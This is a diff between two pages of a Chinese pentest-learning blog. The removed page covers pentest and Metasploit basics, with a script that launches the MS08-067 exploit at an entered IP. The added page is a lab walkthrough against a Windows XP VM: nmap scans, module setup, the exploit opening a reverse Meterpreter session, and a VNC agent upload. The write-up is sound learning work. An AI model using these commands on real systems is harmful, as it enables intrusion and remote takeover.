@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="学习,渗透,">
+  <meta name="keywords" content="渗透,实战演习,">
 
 
 
@@ -79,20 +79,21 @@
 
 
 
-<meta name="description" content="渗透和Metasploit的基本知识">
-<meta name="keywords" content="学习,渗透">
+<meta name="description" content="初次对Win XP的渗透">
+<meta name="keywords" content="渗透,实战演习">
 <meta property="og:type" content="article">
-<meta property="og:title" content="[渗透学习]1.了解渗透测试">
-<meta property="og:url" content="https://zebra233.github.io/2019/08/03/渗透学习-1-了解渗透测试/index.html">
+<meta property="og:title" content="[渗透学习]2.对Winxp的渗透攻击">
+<meta property="og:url" content="https://zebra233.github.io/2019/08/04/渗透学习-2-对Winxp的渗透攻击/index.html">
 <meta property="og:site_name" content="Zebra">
-<meta property="og:description" content="渗透和Metasploit的基本知识">
+<meta property="og:description" content="初次对Win XP的渗透">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://zebra233.github.io/images/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-1-%E4%BA%86%E8%A7%A3%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png">
-<meta property="og:updated_time" content="2019-08-03T10:43:14.129Z">
+<meta property="og:image" content="https://zebra233.github.io/images/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-2-%E5%AF%B9Winxp%E7%9A%84%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB/MS08-067.png">
+<meta property="og:image" content="https://zebra233.github.io/images/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-2-%E5%AF%B9Winxp%E7%9A%84%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB/VNC.png">
+<meta property="og:updated_time" content="2019-08-04T06:34:11.571Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="[渗透学习]1.了解渗透测试">
-<meta name="twitter:description" content="渗透和Metasploit的基本知识">
-<meta name="twitter:image" content="https://zebra233.github.io/images/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-1-%E4%BA%86%E8%A7%A3%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png">
+<meta name="twitter:title" content="[渗透学习]2.对Winxp的渗透攻击">
+<meta name="twitter:description" content="初次对Win XP的渗透">
+<meta name="twitter:image" content="https://zebra233.github.io/images/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-2-%E5%AF%B9Winxp%E7%9A%84%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB/MS08-067.png">
 
 
 
@@ -122,13 +123,13 @@
 
 
 
-  <link rel="canonical" href="https://zebra233.github.io/2019/08/03/渗透学习-1-了解渗透测试/">
+  <link rel="canonical" href="https://zebra233.github.io/2019/08/04/渗透学习-2-对Winxp的渗透攻击/">
 
 
 
 
 
-  <title>[渗透学习]1.了解渗透测试 | Zebra</title>
+  <title>[渗透学习]2.对Winxp的渗透攻击 | Zebra</title>
   
 
 
@@ -287,7 +288,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://zebra233.github.io/2019/08/03/渗透学习-1-了解渗透测试/">
+    <link itemprop="mainEntityOfPage" href="https://zebra233.github.io/2019/08/04/渗透学习-2-对Winxp的渗透攻击/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="K">
@@ -304,7 +305,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">[渗透学习]1.了解渗透测试</h1>
+          <h1 class="post-title" itemprop="name headline">[渗透学习]2.对Winxp的渗透攻击</h1>
         
 
         <div class="post-meta">
@@ -316,8 +317,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-03T15:10:00+08:00">
-                2019-08-03
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-04T13:38:00+08:00">
+                2019-08-04
               </time>
             
 
@@ -332,8 +333,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-08-03T18:43:14+08:00">
-                2019-08-03
+              <time title="更新于" itemprop="dateModified" datetime="2019-08-04T14:34:11+08:00">
+                2019-08-04
               </time>
             
           </span>
@@ -369,8 +370,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2019/08/03/渗透学习-1-了解渗透测试/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/08/03/渗透学习-1-了解渗透测试/" itemprop="commentCount"></span>
+                <a href="/2019/08/04/渗透学习-2-对Winxp的渗透攻击/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/08/04/渗透学习-2-对Winxp的渗透攻击/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -398,70 +399,36 @@
       
 
       
-        <h1>渗透和Metasploit的基本知识</h1>
-<a id="more"></a>
-<h1>一.初识渗透</h1>
-<hr>
-<h2 id="1-渗透基本知识">1.渗透基本知识</h2>
-<h3 id="1-1-渗透分类">1.1.渗透分类</h3>
+        <p>初次对Win XP的渗透</p>
+<h2 id="more"><a id="more"></a></h2>
+<p>** 基本信息:**</p>
 <ul>
-<li>黑盒测试</li>
-<li>白盒测试</li>
-<li>灰盒测试</li>
+<li>Kali: IP:10.10.10.128</li>
+<li>Win Xp Home Edition (未开启防火墙)</li>
 </ul>
-<h3 id="1-2-渗透测试方法">1.2.渗透测试方法</h3>
-<ul>
-<li>OSSTMM</li>
-<li>NIST</li>
-<li>OWASP</li>
-<li>WASC-TC</li>
-<li>PTES</li>
-</ul>
-<h3 id="1-3-渗透测试过程">1.3.渗透测试过程</h3>
-<ol>
-<li>前期交互阶段</li>
-<li>情报搜集阶段</li>
-<li>威胁建模阶段</li>
-<li>漏洞分析阶段</li>
-<li>渗透攻击阶段</li>
-<li>后渗透攻击阶段</li>
-</ol>
+<p><em>两者都为虚拟机</em></p>
 <hr>
-<h2 id="2-漏洞基本知识">2.漏洞基本知识</h2>
-<h3 id="2-1-漏洞生命周期">2.1.漏洞生命周期</h3>
-<p><img src="/images/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-1-%E4%BA%86%E8%A7%A3%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png" alt="漏洞生命周期"></p>
-<h3 id="2-2-漏洞披露方式">2.2.漏洞披露方式</h3>
-<ol>
-<li>完全公开披露</li>
-<li>负责任的公开披露</li>
-<li>地下经济链</li>
-<li>小范围利用直至被披露</li>
-</ol>
-<h3 id="2-3-漏洞公共资源库">2.3.漏洞公共资源库</h3>
-<ul>
-<li><a href="https://www.exploit-db.com/" target="_blank" rel="noopener">Exploit-db</a></li>
-<li><a href="http://www.scap.org.cn/index" target="_blank" rel="noopener">VULHUB</a></li>
-</ul>
-<hr>
-<h2 id="3-metasploit">3.<a href="https://www.metasploit.com/" target="_blank" rel="noopener">Metasploit</a></h2>
-<p>包括了:</p>
-<ul>
-<li>辅助模块</li>
-<li>渗透攻击模块</li>
-<li>攻击载荷模块</li>
-<li>空指令模块</li>
-<li>编码器模块</li>
-</ul>
-<h3 id="3-1-安装metasploit">3.1.安装Metasploit</h3>
-<p><a href="https://www.kali.org/" target="_blank" rel="noopener">Kali</a>自带Metasploit</p>
-<h4 id="msfgui">msfgui</h4>
-<h4 id="msfconsole">msfconsole</h4>
-<h4 id="msfcli-命令行程序">msfcli(命令行程序)</h4>
-<p>用<strong>msfconsole -x</strong>代替</p>
-<p>示例:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;请输入目标IP&quot;</span><br><span class="line"></span><br><span class="line">read ip</span><br><span class="line"></span><br><span class="line">msfconsole -x &quot;</span><br><span class="line">use exploit/windows/smb/ms08_067_netapi;</span><br><span class="line">set RHOST $ip;</span><br><span class="line">set target 10;</span><br><span class="line">exploit&quot;</span><br></pre></td></tr></table></figure>
-<hr>
-<p>参考书籍:<a href="https://book.douban.com/subject/25723796/" target="_blank" rel="noopener">Metasploit渗透测试魔鬼训练营</a></p>
+<h1>渗透过程</h1>
+<h2 id="1-nmap扫描本地网络">1.Nmap扫描本地网络</h2>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; nmap -sP 10.10.10.0/24</span><br><span class="line">[*] exec: nmap -sP 10.10.10.0/24</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-04 13:55 CST</span><br><span class="line">Nmap scan report for 10.10.10.1</span><br><span class="line">Host is up (0.00018s latency).</span><br><span class="line">MAC Address: 00:50:56:C0:00:08 (VMware)</span><br><span class="line">Nmap scan report for 10.10.10.2</span><br><span class="line">Host is up (0.00013s latency).</span><br><span class="line">MAC Address: 00:50:56:E0:25:15 (VMware)</span><br><span class="line">Nmap scan report for 10.10.10.131</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 00:0C:29:85:CA:88 (VMware)</span><br><span class="line">...</span><br><span class="line">Nmap done: 256 IP addresses (5 hosts up) scanned in 4.13 seconds</span><br></pre></td></tr></table></figure>
+<p>其中10.10.10.131为渗透目标</p>
+<h2 id="2-搜集目标信息">2.搜集目标信息</h2>
+<h3 id="2-1获取目标的操作系统信息">2.1获取目标的操作系统信息</h3>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[*] exec: nmap -O 10.10.10.131</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-04 13:58 CST</span><br><span class="line">Nmap scan report for 10.10.10.131</span><br><span class="line">Host is up (0.00055s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">135/tcp open  msrpc</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line">MAC Address: 00:0C:29:85:CA:88 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Microsoft Windows XP|2003</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_xp::sp2:professional cpe:/o:microsoft:windows_server_2003</span><br><span class="line">OS details: Microsoft Windows XP Professional SP2 or Windows Server 2003</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 4.63 seconds</span><br></pre></td></tr></table></figure>
+<p>扫描结果也可能有不正确的地方
+但我们能从中得知OS为Win XP SP2
+<img src="/images/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-2-%E5%AF%B9Winxp%E7%9A%84%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB/MS08-067.png" alt="MS08-067">
+因为我安装的Win XP没更新也没开启防火墙所以可以利用MS08-067发起攻击</p>
+<h2 id="3-利用metasploit的渗透攻击模块进行攻击">3.利用Metasploit的渗透攻击模块进行攻击</h2>
+<h3 id="3-1-搜寻并加载模块">3.1.搜寻并加载模块</h3>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search ms08-067</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                 Disclosure Date  Rank   Check  Description</span><br><span class="line">   -  ----                                 ---------------  ----   -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption</span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">msf5 exploit(windows/smb/ms08_067_netapi) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms08_067_netapi):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   RHOSTS                    yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT    445              yes       The SMB service port (TCP)</span><br><span class="line">   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Targeting</span><br></pre></td></tr></table></figure>
+<h3 id="3-2-设置必要的信息">3.2.设置必要的信息</h3>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(windows/smb/ms08_067_netapi) &gt; set RHOSTS 10.10.10.131</span><br><span class="line">RHOSTS =&gt; 10.10.10.131</span><br><span class="line">msf5 exploit(windows/smb/ms08_067_netapi) &gt; show targets</span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Targeting</span><br><span class="line">   1   Windows 2000 Universal</span><br><span class="line">   2   Windows XP SP0/SP1 Universal</span><br><span class="line">   3   Windows 2003 SP0 Universal</span><br><span class="line">   4   Windows XP SP2 English (AlwaysOn NX)</span><br><span class="line">   5   Windows XP SP2 English (NX)</span><br><span class="line">   6   Windows XP SP3 English (AlwaysOn NX)</span><br><span class="line">   7   Windows XP SP3 English (NX)</span><br><span class="line">   8   Windows XP SP2 Arabic (NX)</span><br><span class="line">   9   Windows XP SP2 Chinese - Traditional / Taiwan (NX)</span><br><span class="line">   10  Windows XP SP2 Chinese - Simplified (NX)</span><br><span class="line">   11  Windows XP SP2 Chinese - Traditional (NX)</span><br><span class="line">   12  Windows XP SP2 Czech (NX)</span><br><span class="line">   13  Windows XP SP2 Danish (NX)</span><br><span class="line">   14  Windows XP SP2 German (NX)</span><br><span class="line">   15  Windows XP SP2 Greek (NX)</span><br><span class="line">   16  Windows XP SP2 Spanish (NX)</span><br><span class="line">   17  Windows XP SP2 Finnish (NX)</span><br><span class="line">   18  Windows XP SP2 French (NX)</span><br><span class="line">   19  Windows XP SP2 Hebrew (NX)</span><br><span class="line">   20  Windows XP SP2 Hungarian (NX)</span><br><span class="line">   21  Windows XP SP2 Italian (NX)</span><br><span class="line">   22  Windows XP SP2 Japanese (NX)</span><br><span class="line">   23  Windows XP SP2 Korean (NX)</span><br><span class="line">   24  Windows XP SP2 Dutch (NX)</span><br><span class="line">   25  Windows XP SP2 Norwegian (NX)</span><br><span class="line">   26  Windows XP SP2 Polish (NX)</span><br><span class="line">   27  Windows XP SP2 Portuguese - Brazilian (NX)</span><br><span class="line">   28  Windows XP SP2 Portuguese (NX)</span><br><span class="line">   29  Windows XP SP2 Russian (NX)</span><br><span class="line">   30  Windows XP SP2 Swedish (NX)</span><br><span class="line">   31  Windows XP SP2 Turkish (NX)</span><br><span class="line">   32  Windows XP SP3 Arabic (NX)</span><br><span class="line">   33  Windows XP SP3 Chinese - Traditional / Taiwan (NX)</span><br><span class="line">   34  Windows XP SP3 Chinese - Simplified (NX)</span><br><span class="line">   35  Windows XP SP3 Chinese - Traditional (NX)</span><br><span class="line">   36  Windows XP SP3 Czech (NX)</span><br><span class="line">   37  Windows XP SP3 Danish (NX)</span><br><span class="line">   38  Windows XP SP3 German (NX)</span><br><span class="line">   39  Windows XP SP3 Greek (NX)</span><br><span class="line">   40  Windows XP SP3 Spanish (NX)</span><br><span class="line">   41  Windows XP SP3 Finnish (NX)</span><br><span class="line">   42  Windows XP SP3 French (NX)</span><br><span class="line">   43  Windows XP SP3 Hebrew (NX)</span><br><span class="line">   44  Windows XP SP3 Hungarian (NX)</span><br><span class="line">   45  Windows XP SP3 Italian (NX)</span><br><span class="line">   46  Windows XP SP3 Japanese (NX)</span><br><span class="line">   47  Windows XP SP3 Korean (NX)</span><br><span class="line">   48  Windows XP SP3 Dutch (NX)</span><br><span class="line">   49  Windows XP SP3 Norwegian (NX)</span><br><span class="line">   50  Windows XP SP3 Polish (NX)</span><br><span class="line">   51  Windows XP SP3 Portuguese - Brazilian (NX)</span><br><span class="line">   52  Windows XP SP3 Portuguese (NX)</span><br><span class="line">   53  Windows XP SP3 Russian (NX)</span><br><span class="line">   54  Windows XP SP3 Swedish (NX)</span><br><span class="line">   55  Windows XP SP3 Turkish (NX)</span><br><span class="line">   56  Windows 2003 SP1 English (NO NX)</span><br><span class="line">   57  Windows 2003 SP1 English (NX)</span><br><span class="line">   58  Windows 2003 SP1 Japanese (NO NX)</span><br><span class="line">   59  Windows 2003 SP1 Spanish (NO NX)</span><br><span class="line">   60  Windows 2003 SP1 Spanish (NX)</span><br><span class="line">   61  Windows 2003 SP1 French (NO NX)</span><br><span class="line">   62  Windows 2003 SP1 French (NX)</span><br><span class="line">   63  Windows 2003 SP2 English (NO NX)</span><br><span class="line">   64  Windows 2003 SP2 English (NX)</span><br><span class="line">   65  Windows 2003 SP2 German (NO NX)</span><br><span class="line">   66  Windows 2003 SP2 German (NX)</span><br><span class="line">   67  Windows 2003 SP2 Portuguese - Brazilian (NX)</span><br><span class="line">   68  Windows 2003 SP2 Spanish (NO NX)</span><br><span class="line">   69  Windows 2003 SP2 Spanish (NX)</span><br><span class="line">   70  Windows 2003 SP2 Japanese (NO NX)</span><br><span class="line">   71  Windows 2003 SP2 French (NO NX)</span><br><span class="line">   72  Windows 2003 SP2 French (NX)</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/smb/ms08_067_netapi) &gt; set target 10</span><br><span class="line">target =&gt; 10</span><br><span class="line">msf5 exploit(windows/smb/ms08_067_netapi) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms08_067_netapi):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   RHOSTS   10.10.10.131     yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT    445              yes       The SMB service port (TCP)</span><br><span class="line">   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   10  Windows XP SP2 Chinese - Simplified (NX)</span><br></pre></td></tr></table></figure>
+<h3 id="3-3-发起攻击">3.3.发起攻击</h3>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">msf5 exploit(windows/smb/ms08_067_netapi) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.128:4444 </span><br><span class="line">[*] 10.10.10.131:445 - Attempting to trigger the vulnerability...</span><br><span class="line">[*] Sending stage (179779 bytes) to 10.10.10.131</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.10.128:4444 -&gt; 10.10.10.131:1046) at 2019-08-04 14:23:41 +0800</span><br></pre></td></tr></table></figure>
+<h3 id="3-4-攻击载荷模块">3.4.攻击载荷模块</h3>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ipconfig</span><br><span class="line"></span><br><span class="line">Interface  1</span><br><span class="line">============</span><br><span class="line">Name         : MS TCP Loopback interface</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1520</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line"></span><br><span class="line">Interface  2</span><br><span class="line">============</span><br><span class="line">Name         : AMD PCNET Family PCI Ethernet Adapter - rface</span><br><span class="line">Hardware MAC : 00:0c:29:85:ca:88</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 10.10.10.131</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line"></span><br><span class="line">Interface 65540</span><br><span class="line">============</span><br><span class="line">Name         : Bluetooth @�</span><br><span class="line">Hardware MAC : c8:21:58:95:b0:86</span><br><span class="line">MTU          : 1500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run vnc</span><br><span class="line">[*] Creating a VNC reverse tcp stager: LHOST=10.10.10.128 LPORT=4545</span><br><span class="line">[*] Running payload handler</span><br><span class="line">[*] VNC stager executable 73802 bytes long</span><br><span class="line">[*] Uploaded the VNC agent to C:\WINDOWS\TEMP\jOcidjq.exe (must be deleted manually)</span><br><span class="line">[*] Executing the VNC agent with endpoint 10.10.10.128:4545...</span><br></pre></td></tr></table></figure>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-2-%E5%AF%B9Winxp%E7%9A%84%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB/VNC.png" alt="VNC"></p>
 
       
     </div>
@@ -482,7 +449,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://zebra233.github.io/2019/08/03/渗透学习-1-了解渗透测试/" title="[渗透学习]1.了解渗透测试">https://zebra233.github.io/2019/08/03/渗透学习-1-了解渗透测试/</a>
+    <a href="https://zebra233.github.io/2019/08/04/渗透学习-2-对Winxp的渗透攻击/" title="[渗透学习]2.对Winxp的渗透攻击">https://zebra233.github.io/2019/08/04/渗透学习-2-对Winxp的渗透攻击/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -497,9 +464,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/学习/" rel="tag"># 学习</a>
-          
             <a href="/tags/渗透/" rel="tag"># 渗透</a>
+          
+            <a href="/tags/实战演习/" rel="tag"># 实战演习</a>
           
         </div>
       
@@ -512,15 +479,15 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2019/08/03/渗透学习-1-了解渗透测试/" rel="next" title="[渗透学习]1.了解渗透测试">
+                <i class="fa fa-chevron-left"></i> [渗透学习]1.了解渗透测试
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/08/04/渗透学习-2-对Winxp的渗透攻击/" rel="prev" title="[渗透学习]2.对Winxp的渗透攻击">
-                [渗透学习]2.对Winxp的渗透攻击 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -668,7 +635,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">1.</span> <span class="nav-text">渗透和Metasploit的基本知识</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">2.</span> <span class="nav-text">一.初识渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-渗透基本知识"><span class="nav-number">2.1.</span> <span class="nav-text">1.渗透基本知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-渗透分类"><span class="nav-number">2.1.1.</span> <span class="nav-text">1.1.渗透分类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-渗透测试方法"><span class="nav-number">2.1.2.</span> <span class="nav-text">1.2.渗透测试方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-渗透测试过程"><span class="nav-number">2.1.3.</span> <span class="nav-text">1.3.渗透测试过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-漏洞基本知识"><span class="nav-number">2.2.</span> <span class="nav-text">2.漏洞基本知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-漏洞生命周期"><span class="nav-number">2.2.1.</span> <span class="nav-text">2.1.漏洞生命周期</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-漏洞披露方式"><span class="nav-number">2.2.2.</span> <span class="nav-text">2.2.漏洞披露方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-漏洞公共资源库"><span class="nav-number">2.2.3.</span> <span class="nav-text">2.3.漏洞公共资源库</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-metasploit"><span class="nav-number">2.3.</span> <span class="nav-text">3.Metasploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-安装metasploit"><span class="nav-number">2.3.1.</span> <span class="nav-text">3.1.安装Metasploit</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#msfgui"><span class="nav-number">2.3.1.1.</span> <span class="nav-text">msfgui</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#msfconsole"><span class="nav-number">2.3.1.2.</span> <span class="nav-text">msfconsole</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#msfcli-命令行程序"><span class="nav-number">2.3.1.3.</span> <span class="nav-text">msfcli(命令行程序)</span></a></li></ol></li></ol></li></ol></li></ol></div>
